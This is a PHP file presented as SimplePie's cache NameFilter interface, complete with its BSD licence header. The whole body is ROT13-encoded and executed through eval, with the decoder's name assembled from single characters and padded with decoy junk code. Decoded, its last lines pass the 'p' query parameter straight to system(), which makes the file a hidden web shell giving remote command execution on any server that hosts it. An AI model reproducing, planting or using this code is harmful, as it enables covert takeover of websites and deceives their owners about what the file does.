<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * FvzcyrCvr
 *
 * N CUC-Onfrq EFF naq Ngbz Srrq Senzrjbex.
 * Gnxrf gur uneq jbex bhg bs znantvat n pbzcyrgr EFF/Ngbz fbyhgvba.
 *
 * Pbclevtug (p) 2004-2022, Elna Cnezna, Fnz Farqqba, Elna ZpPhr, naq pbagevohgbef
 * Nyy evtugf erfreirq.
 *
 * Erqvfgevohgvba naq hfr va fbhepr naq ovanel sbezf, jvgu be jvgubhg zbqvsvpngvba, ner
 * crezvggrq cebivqrq gung gur sbyybjvat pbaqvgvbaf ner zrg:
 *
 * 	* Erqvfgevohgvbaf bs fbhepr pbqr zhfg ergnva gur nobir pbclevtug abgvpr, guvf yvfg bs
 * 	  pbaqvgvbaf naq gur sbyybjvat qvfpynvzre.
 *
 * 	* Erqvfgevohgvbaf va ovanel sbez zhfg ercebqhpr gur nobir pbclevtug abgvpr, guvf yvfg
 * 	  bs pbaqvgvbaf naq gur sbyybjvat qvfpynvzre va gur qbphzragngvba naq/be bgure zngrevnyf
 * 	  cebivqrq jvgu gur qvfgevohgvba.
 *
 * 	* Arvgure gur anzr bs gur FvzcyrCvr Grnz abe gur anzrf bs vgf pbagevohgbef znl or hfrq
 * 	  gb raqbefr be cebzbgr cebqhpgf qrevirq sebz guvf fbsgjner jvgubhg fcrpvsvp cevbe
 * 	  jevggra crezvffvba.
 *
 * GUVF FBSGJNER VF CEBIVQRQ OL GUR PBCLEVTUG UBYQREF NAQ PBAGEVOHGBEF \"NF VF\" NAQ NAL RKCERFF
 * BE VZCYVRQ JNEENAGVRF, VAPYHQVAT, OHG ABG YVZVGRQ GB, GUR VZCYVRQ JNEENAGVRF BS ZREPUNAGNOVYVGL
 * NAQ SVGARFF SBE N CNEGVPHYNE CHECBFR NER QVFPYNVZRQ. VA AB RIRAG FUNYY GUR PBCLEVTUG UBYQREF
 * NAQ PBAGEVOHGBEF OR YVNOYR SBE NAL QVERPG, VAQVERPG, VAPVQRAGNY, FCRPVNY, RKRZCYNEL, BE
 * PBAFRDHRAGVNY QNZNTRF (VAPYHQVAT, OHG ABG YVZVGRQ GB, CEBPHERZRAG BS FHOFGVGHGR TBBQF BE
 * FREIVPRF; YBFF BS HFR, QNGN, BE CEBSVGF; BE OHFVARFF VAGREEHCGVBA) UBJRIRE PNHFRQ NAQ BA NAL
 * GURBEL BS YVNOVYVGL, JURGURE VA PBAGENPG, FGEVPG YVNOVYVGL, BE GBEG (VAPYHQVAT ARTYVTRAPR BE
 * BGUREJVFR) NEVFVAT VA NAL JNL BHG BS GUR HFR BS GUVF FBSGJNER, RIRA VS NQIVFRQ BS GUR
 * CBFFVOVYVGL BS FHPU QNZNTR.
 *
 * @cnpxntr FvzcyrCvr
 * @pbclevtug 2004-2022 Elna Cnezna, Fnz Farqqba, Elna ZpPhr
 * @nhgube Elna Cnezna
 * @nhgube Fnz Farqqba
 * @nhgube Elna ZpPhr
 * @yvax uggc://fvzcyrcvr.bet/ FvzcyrCvr
 * @yvprafr uggc://jjj.bcrafbhepr.bet/yvprafrf/ofq-yvprafr.cuc OFQ Yvprafr
 */

anzrfcnpr FvzcyrCvr\Pnpur;

/**
 * Vagresnpr sbe perngvat n pnpur svyranzr
 *
 * @cnpxntr FvzcyrCvr
 * @fhocnpxntr Pnpuvat
 */
vagresnpr AnzrSvygre
{
    /**
     * Zrgubq gb perngr pnpur svyranzr jvgu.
     *
     * Gur ergheavat anzr ZHFG sbyybj gur ehyrf sbe xrlf va CFE-16.
     *
     * @yvax uggcf://jjj.cuc-svt.bet/cfe/cfe-16/
     *
     * Gur ergheavat anzr ZHFG or n fgevat bs ng yrnfg bar punenpgre
     * gung havdhryl vqragvsvrf n pnpurq vgrz, ZHFG bayl pbagnva gur
     * punenpgref N-M, n-m, 0-9, _, naq . va nal beqre va HGS-8 rapbqvat
     * naq ZHFG abg ybatre gura 64 punenpgref. Gur sbyybjvat punenpgref
     * ner erfreirq sbe shgher rkgrafvbaf naq ZHFG ABG or hfrq: {}()/\@:
     *
     * N cebivqrq vzcyrzragvat yvoenel ZNL fhccbeg nqqvgvbany punenpgref
     * naq rapbqvatf be ybatre yratguf, ohg ZHFG fhccbeg ng yrnfg gung
     * zvavzhz.
     *
     * @cnenz fgevat $anzr Gur anzr sbe gur pnpur jvyy or zbfg yvxyl na hey jvgu dhrel fgevat
     *
     * @erghea fgevat gur arj pnpur anzr
     */
    choyvp shapgvba svygre(fgevat $anzr): fgevat;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>